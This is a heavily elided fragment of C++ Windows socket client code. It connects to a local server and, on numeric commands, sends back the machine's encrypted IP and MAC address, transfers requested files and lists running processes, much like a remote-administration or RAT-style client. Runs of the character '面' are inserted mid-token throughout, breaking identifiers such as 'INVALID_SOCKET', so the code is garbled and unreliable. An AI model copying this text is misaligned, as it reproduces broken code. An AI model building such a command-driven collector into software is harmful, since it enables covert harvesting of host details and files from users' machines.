...
tuple1 getMAC()
{
 ...
 面面面面面面面面面面       printf("Address: %s, mac: %s\n", ipAddress, mac_addr);
...
string PrintProcessNameAndID(DWORD processID)
{
    ...
    // Get a handle to the面面面面面面面面面面 process.
...
#elif __APPLE__ || __MACH__面面面面面面面面面面
    return "Mac OSX";
#elif __linux__
    return "Linux";
#elif __FreeBSD__
...
int __cdecl main(int argc, 面面面面面面面面面面char **argv)
{
    WSADATA wsaData;
    ...
    char recvbuf[DEFAULT_BUFLEN]面面面面面面面面面面;
    int iResult;
    ...
    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, 面面面面面面面面面面&hints, &result);
    if (iResult != 0)
    {
    ...
    if (ConnectSocket == INVALID_SO面面面面面面面面面面CKET)
    {
    ...
    while (true)
    {
        ...
        if (rc.find("1") != std::string::npos)
        {
            ...
            information面面面面面面面面面面.ipAddress += '\000';
            ...
            encryptedString = encryption面面面面面面面面面面(information.macAddress);
            strcpy(encrypted_star, encryptedString.c_str());
            ...
            strcpy(encrypted_star, encryptedString.c_str());
            iResult = send(ConnectSocket, encrypted_star, strlen(encrypted_star), 0);
            memset(rec面面面面面面面面面面vbuf, 0, sizeof recvbuf);
        }
        else if (rc.find("2") != std::string::npos)
        {
            ...
            if (myfile.is_open())
            {
                ...
                myfile.close();
                FILE *f = fopen(recvbuf, "面面面面面面面面面面rb");
                fseek(f, 0, SEEK_END);
                long fsize = ftell(f);
                fseek(f, 0, SEEK_SET);
                ...
                iResult = recv(ConnectSocket, recvbuf, strlen(r面面面面面面面面面面ecvbuf), 0);
     ...
     面面面面面面面面面面       DWORD aProcesses[1024], cbNeeded, cProcesses;
            unsigned int i;
            ...
            {
                iResult = send(ConnectSocket, "1", strlen("1"), 0);
                cout << "Getting all the running processess面面面面面面面面面面" << endl;
            }
            iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
            ...
            for (i = 0; i < cProcesses; i++)
            {
                if (aProcesses[i] != 0)
                {
                    data += PrintProcessNameAndID(aProcesses[i]);面面面面面面面面面面
                }
            }
            ...
            while (ie < data.length())
            {
                if(ie+templn>data.length()){
                    ...
                    te面面面面面面面面面面mp = data.substr(ie, templn);
                }
        ...
        else if (rc.find("4") != s面面面面面面面面面面td::string::npos)
        {
            cout << "Quiting" << endl;
            break;
        }
